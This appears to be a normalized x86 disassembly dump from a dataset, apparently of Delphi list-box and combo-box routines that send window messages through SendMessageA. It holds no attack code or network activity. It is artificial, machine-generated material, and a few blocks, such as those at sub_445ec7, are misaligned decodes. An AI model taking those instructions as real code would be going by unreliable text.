mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_451da8
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_45b1b0
sub_445de4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4552e8
mov eax [ ebp - 0x4 ]
call sub_4553b8
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call SendMessageA
push ebp
call sub_445d28
pop ecx
mov eax [ ebp - 0x4 ]
call sub_44e4c0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403518
sub_445e70
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_445648
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_451e6c
mov eax ebx
mov si 0xffc8
call sub_403518
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_445ec7
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x3e65173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
pop ebx
retn
sub_445efc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_445f71
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44e8b4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_465758
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_454538
mov eax ebx
mov si 0xffb8
call sub_403518
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445f78
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_445f80
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403518
jmp r-xdata
pop esi
retn
sub_44600c
push 0x0
push edi
push 0x18a
mov eax esi
call sub_4550b4
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404764
test esi esi
je sub_44607a
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax ebx
call sub_41a114
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4045d8
push eax
push edi
push 0x189
mov eax [ ebx + 0x10 ]
call sub_4550b4
push eax
call SendMessageA
mov esi eax
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404764
sub_4460a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_446123
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffb1
call sub_403518
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_447c50
mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44612a
lea eax [ ebp - 0x8 ]
call sub_404118
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41a114
sub_446134
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ esp + 0x4 ] eax
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb3
call sub_403518
mov [ esp + 0x8 ] eax
xor ecx ecx
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_403518
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push 0x0
mov ecx [ esp + 0x4 ]
mov edx ebp
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x64 ]
mov ecx [ esp + 0x8 ]
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_403518
mov edx [ esp + 0x4 ]
mov eax [ edi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4461b4
push esi
mov esi eax
cmp edx 0xffffffff
je r-xdata
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
mov eax [ esi + 0x10 ]
mov si 0xffb0
call sub_403518
sub_4461dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_446269
push [ fs : eax ]
mov [ fs : eax ] esp
or esi 0xffffffff
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446270
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
push 0x0
push 0x180
mov eax edi
call sub_4550b4
push eax
call SendMessageA
mov esi eax
test esi esi
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
sub_44627c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_446305
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44630c
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
push edi
push 0x181
mov eax esi
call sub_4550b4
push eax
call SendMessageA
test eax eax
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
sub_446324
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_446474
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44647b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40413c
retn
mov eax [ ebp - 0x4 ]
call sub_419f98
xor eax eax
push ebp
push sub_446452
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_403518
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov si 0xffb3
call sub_403518
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb2
call sub_403518
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_403518
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp edi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a054
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_4463bf
sar ebx 0x1
dec [ ebx - 0x3ba7438 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb2
call sub_403518
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_403518
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp edi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a054
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_446494
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_4550b4
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_44edf0
sub_4464c8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
call sub_4045d8
push eax
push 0xffffffff
push 0x1a2
mov eax esi
call sub_4550b4
push eax
call SendMessageA
mov edx edi
mov eax esi
call sub_447c78
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44650c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44660b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446612
lea eax [ ebp - 0xc ]
call sub_404118
retn
mov eax [ ebp - 0x4 ]
call sub_419f98
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x1
xor eax eax
push ebp
push sub_4465ee
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_41a054
retn
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_403518
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
xor ecx ecx
mov edx ebx
mov si 0xffb2
call sub_403518
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_403518
sub_44661c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_450de0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax ebx
call sub_44e070
mov edx 0x61
mov eax ebx
call sub_44e094
mov dl 0x1
mov eax ebx
call sub_4552e8
xor edx edx
mov eax ebx
call sub_44ea78
mov [ ebx + 0x210 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov esi eax
mov [ ebx + 0x218 ] esi
mov [ esi + 0x10 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42541c
mov esi eax
mov [ ebx + 0x228 ] esi
mov eax esi
mov edx ebx
call sub_44d490
mov [ ebx + 0x230 ] 0x10
mov [ ebx + 0x224 ] 0x1
mov [ ebx + 0x23b ] 0x1
mov [ ebx + 0x234 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_446708
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_450f04
mov eax [ esi + 0x228 ]
call sub_40331c
mov eax [ esi + 0x218 ]
call sub_40331c
mov eax [ esi + 0x240 ]
call sub_40331c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4467d4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x199
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4467f4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x19a
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_446830
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x182
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_446850
push ebx
mov ebx eax
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
pop ebx
retn
push 0x0
push 0x0
push 0x184
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
sub_446884
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
or edx 0xffffffff
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
xor ecx ecx
mov edx edi
mov eax esi
call sub_446cd8
inc edi
dec ebx
jne r-xdata
jmp r-xdata
sub_4468cc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4469e3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4469ea
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_40413c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x18 ]
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4045d8
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404310
mov eax [ ebp - 0x14 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebx + 0x218 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4045d8
mov edx eax
lea eax [ ebp - 0xc ]
call sub_404310
mov eax [ ebp - 0xc ]
push eax
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0xd4 ]
mov edx esi
mov eax ebx
call sub_446c88
test al al
je r-xdata
jmp r-xdata
sub_4469f4
push ebx
push esi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax esi
call sub_446c88
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
pop esi
pop ebx
retn
sub_446a60
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
jle r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
jle r-xdata
mov eax ebx
call sub_44e2b8
mov [ esp ] eax
fild [ esp ]
fild [ ebx + 0x22c ]
fdivp st1
call sub_402ac8
mov esi eax
cmp esi 0x1
jge r-xdata
push 0x0
push esi
push 0x195
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
mov esi 0x1
sub_446ab4
push ebx
mov ebx eax
cmp edx [ ebx + 0x22c ]
je r-xdata
pop ebx
retn
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_452654
jmp r-xdata
test edx edx
jne r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov eax ebx
call sub_446a60
sub_446af8
push ebx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x188
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x0
push 0x19f
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
pop ebx
retn
sub_446b74
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push esi
push 0x186
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
push 0x0
push esi
push 0x19e
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
jmp r-xdata
sub_446bd4
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x239 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x239 ] dl
mov eax ebx
call sub_452654
mov eax ebx
mov si 0xffd0
call sub_403518
sub_446bfc
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x230 ]
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov eax esi
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov edx 0x198
mov eax ebx
call sub_44fa80
mov esi [ esp + 0xc ]
sub esi [ esp + 0x4 ]
sub_446c88
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x187
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x1
sbb eax eax
inc eax
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
sub_446cd8
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x208 ] 0x0
je r-xdata
test bl bl
je r-xdata
push esi
xor eax eax
mov al bl
push eax
push 0x185
mov eax edi
call sub_4550b4
push eax
call SendMessageA
inc eax
jne r-xdata
push 0x0
push 0xffffffff
push 0x186
mov eax edi
call sub_4550b4
push eax
call SendMessageA
push 0x0
push esi
push 0x186
mov eax edi
call sub_4550b4
push eax
call SendMessageA
inc eax
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
jmp r-xdata
sub_446dac
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x238 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
add al 0xfd
sub al 0x2
jae r-xdata
mov [ esi + 0x238 ] bl
mov eax esi
call sub_452654
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax esi
call sub_446d88
sub_446e04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_446eac
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446eb3
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404118
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_4045d8
mov edx eax
mov eax [ esi + 0x8 ]
call sub_408be0
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov [ esi + 0xc ] eax
jmp r-xdata
sub_446eb8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_446f4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446f55
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404118
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov [ esi + 0xc ] eax
jmp r-xdata
sub_446f70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_446de8
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x197
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
sub_446f9c
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub al 0x3
je r-xdata
xor edx edx
mov eax ebx
call sub_446dac
jmp r-xdata
dec al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_446dac
jmp r-xdata
sub_446fe0
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x20 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x20 ]
push eax
call PtInRect
test eax eax
je r-xdata
or ebp 0xffffffff
mov eax esi
call sub_446de8
mov ebp eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
cmp edi ebp
jle r-xdata
test bl bl
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx ebp
mov edx 0x198
mov eax esi
call sub_44fa80
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax ebp
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
cmp edi ebp
jg r-xdata
sub_44706c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_451f40
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_451e6c
mov esi rw-data
cmp [ ebx + 0x23b ] 0x0
je r-xdata
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
setb dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
or edx 0x300000
or edx 0x1
or edx [ edi + 0x4 ]
